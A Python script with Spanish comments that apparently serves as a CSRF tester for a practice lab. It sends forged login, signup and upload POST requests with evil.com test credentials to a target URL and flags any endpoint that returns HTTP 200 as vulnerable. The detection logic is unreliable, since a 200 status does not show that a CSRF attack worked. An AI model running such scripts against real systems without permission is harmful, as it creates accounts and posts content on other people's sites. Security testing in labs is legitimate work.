#!/usr/bin/env python3
"""
Script para probar vulnerabilidades CSRF
"""

import requests
import time
import sys
from urllib.parse import urljoin

class CSRFTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
    
    def test_login_csrf(self):
        """Prueba CSRF en formulario de login"""
        print("[+] Probando CSRF en formulario de login...")
        
        login_data = {
            'email': 'csrf.test@evil.com',
            'password': 'csrf123456'
        }
        
        try:
            response = self.session.post(
                urljoin(self.base_url, '/csrf/login_exec.php'),
                data=login_data,
                timeout=10
            )
            
            print(f"    Status Code: {response.status_code}")
            print(f"    Response Length: {len(response.text)}")
            
            if response.status_code == 200:
                print("    ✅ Ataque CSRF de login ejecutado exitosamente")
                return True
            else:
                print("    ❌ Ataque CSRF de login falló")
                return False
                
        except Exception as e:
            print(f"    ❌ Error en ataque CSRF de login: {e}")
            return False
    
    def test_signup_csrf(self):
        """Prueba CSRF en formulario de registro"""
        print("[+] Probando CSRF en formulario de registro...")
        
        signup_data = {
            'fname': 'CSRF',
            'lname': 'Tester',
            'email': 'csrf.tester@evil.com',
            'password': 'csrf789012',
            'gender': 'male',
            'cno': '1234567890',
            'age': '25',
            'submit': 'Submit'
        }
        
        try:
            response = self.session.post(
                urljoin(self.base_url, '/csrf/signin.php'),
                data=signup_data,
                timeout=10
            )
            
            print(f"    Status Code: {response.status_code}")
            print(f"    Response Length: {len(response.text)}")
            
            if response.status_code == 200:
                print("    ✅ Ataque CSRF de registro ejecutado exitosamente")
                return True
            else:
                print("    ❌ Ataque CSRF de registro falló")
                return False
                
        except Exception as e:
            print(f"    ❌ Error en ataque CSRF de registro: {e}")
            return False
    
    def test_upload_csrf(self):
        """Prueba CSRF en formulario de upload"""
        print("[+] Probando CSRF en formulario de upload...")
        
        upload_data = {
            'title': 'CSRF Test Upload',
            'comp': 'Este es un contenido de prueba subido mediante CSRF. Demuestra que un atacante puede hacer que la víctima suba contenido sin su conocimiento.',
            'submit': 'Submit'
        }
        
        try:
            response = self.session.post(
                urljoin(self.base_url, '/csrf/upload.php'),
                data=upload_data,
                timeout=10
            )
            
            print(f"    Status Code: {response.status_code}")
            print(f"    Response Length: {len(response.text)}")
            
            if response.status_code == 200:
                print("    ✅ Ataque CSRF de upload ejecutado exitosamente")
                return True
            else:
                print("    ❌ Ataque CSRF de upload falló")
                return False
                
        except Exception as e:
            print(f"    ❌ Error en ataque CSRF de upload: {e}")
            return False
    
    def run_all_tests(self):
        """Ejecuta todas las pruebas CSRF"""
        print("=" * 60)
        print("INICIANDO PRUEBAS DE VULNERABILIDAD CSRF")
        print("=" * 60)
        print(f"Objetivo: {self.base_url}")
        print()
        
        results = []
        
        # Ejecutar pruebas
        results.append(("Login CSRF", self.test_login_csrf()))
        time.sleep(2)
        
        results.append(("Signup CSRF", self.test_signup_csrf()))
        time.sleep(2)
        
        results.append(("Upload CSRF", self.test_upload_csrf()))
        
        # Mostrar resumen
        print("\n" + "=" * 60)
        print("RESUMEN DE RESULTADOS")
        print("=" * 60)
        
        vulnerable_count = 0
        for test_name, result in results:
            status = "VULNERABLE" if result else "PROTECTED"
            icon = "✅" if result else "❌"
            print(f"{icon} {test_name}: {status}")
            if result:
                vulnerable_count += 1
        
        print(f"\nTotal de vulnerabilidades encontradas: {vulnerable_count}/{len(results)}")
        
        if vulnerable_count > 0:
            print("\n⚠️  ADVERTENCIA: Se encontraron vulnerabilidades CSRF!")
            print("   La aplicación es vulnerable a ataques Cross-Site Request Forgery.")
            print("   Se recomienda implementar tokens CSRF en todos los formularios.")
        else:
            print("\n✅ No se encontraron vulnerabilidades CSRF.")
        
        return results

def main():
    if len(sys.argv) != 2:
        print("Uso: python3 test_csrf.py <URL_BASE>")
        print("Ejemplo: python3 test_csrf.py http://hackme1.vulnmachines.com")
        sys.exit(1)
    
    base_url = sys.argv[1]
    if not base_url.startswith('http'):
        base_url = 'http://' + base_url
    
    tester = CSRFTester(base_url)
    tester.run_all_tests()

if __name__ == "__main__":
    main()